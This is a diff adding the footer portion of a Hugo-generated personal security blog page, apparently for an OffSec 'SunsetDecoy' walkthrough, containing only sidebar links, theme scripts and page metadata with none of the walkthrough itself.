+      <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="Hackthebox--Streamline-Simple-Icons" height="20" width="20">
+        <path d="m22.5106 6.4566 0.0008 -0.0123a0.888 0.888 0 0 0 -0.2717 -0.6384c-0.0084 -0.0084 -0.018 -0.0155 -0.0267 -0.0235 -0.0186 -0.0166 -0.0371 -0.0333 -0.0572 -0.0484 -0.0193 -0.0147 -0.04 -0.0276 -0.0607 -0.0406 -0.0096 -0.006 -0.0182 -0.0131 -0.0281 -0.0188L12.4576 0.1266a0.891 0.891 0 0 0 -0.9223 0.0043L1.933 5.6744c-0.0107 0.0062 -0.0203 0.014 -0.0307 0.0205 -0.0073 0.0047 -0.015 0.008 -0.0223 0.0128 -0.007 0.0047 -0.013 0.0106 -0.02 0.0155a0.8769 0.8769 0 0 0 -0.147 0.1333l-0.0026 0.003a0.8872 0.8872 0 0 0 -0.2218 0.5847l0.0009 0.014c-0.0002 0.0088 -0.0015 0.0176 -0.0015 0.0264v11.0708c0 0.3277 0.1802 0.6288 0.469 0.7836l9.5986 5.5417c0.0076 0.0044 0.0158 0.0075 0.0236 0.0117a0.8754 0.8754 0 0 0 0.166 0.0687c0.0134 0.004 0.0266 0.0083 0.0401 0.0117a0.8793 0.8793 0 0 0 0.072 0.0142c0.0117 0.0019 0.0232 0.0045 0.0349 0.006a0.835 0.835 0 0 0 0.2157 0c0.0117 -0.0015 0.0232 -0.0041 0.0348 -0.006a0.9 0.9 0 0 0 0.072 -0.0142c0.0135 -0.0034 0.0267 -0.0077 0.04 -0.0117a0.895 0.895 0 0 0 0.0646 -0.0217 0.9134 0.9134 0 0 0 0.1015 -0.047c0.0078 -0.0042 0.016 -0.0072 0.0236 -0.0117l9.5986 -5.5417a0.8888 0.8888 0 0 0 0.469 -0.7836V6.4779c0 -0.0071 -0.0012 -0.0142 -0.0014 -0.0213zM5.2543 6.0822l6.5367 -3.774a0.4182 0.4182 0 0 1 0.4182 0l6.5366 3.774a0.4182 0.4182 0 0 1 0 0.7243l-6.5367 3.774a0.4182 0.4182 0 0 1 -0.4182 0l-6.5366 -3.774a0.4182 0.4182 0 0 1 0 -0.7243zm5.6134 14.3449a0.4172 0.4172 0 0 1 -0.626 0.3613L3.718 17.0218a0.4173 0.4173 0 0 1 -0.2086 -0.3613V9.1279a0.4172 0.4172 0 0 1 0.6258 -0.3613l6.524 3.7666a0.4172 0.4172 0 0 1 0.2086 0.3614v7.5325zm9.623 -3.7666a0.4173 0.4173 0 0 1 -0.2086 0.3613l-6.5239 3.7666a0.4172 0.4172 0 0 1 -0.6259 -0.3613v-7.5325c0 -0.149 0.0796 -0.2868 0.2087 -0.3614l6.5239 -3.7666a0.4172 0.4172 0 0 1 0.6258 0.3613v7.5326z" fill="#00ff00" stroke-width="1"></path>
+      </svg>
+    </a>
+  </div><div class="icon-discord sidebar-social-icon">
+      <a
+        href="https://discordapp.com/users/mth7848"
+        itemprop="url"
+        target="_blank"
+        aria-label="discord"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/D1as0x"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/matheusdiasmello/"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "D1as0x",
+          title: "SunsetDecoy - Easy",
+          url: "http:\/\/localhost:1313\/posts\/offsec\/sunsetdecoy\/",
+          description: "SunsetDecoy Walkthrough (OffSec - Easy).",
+          cover: "http:\/\/localhost:1313\/sunsetDecoy\/sunset.png",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
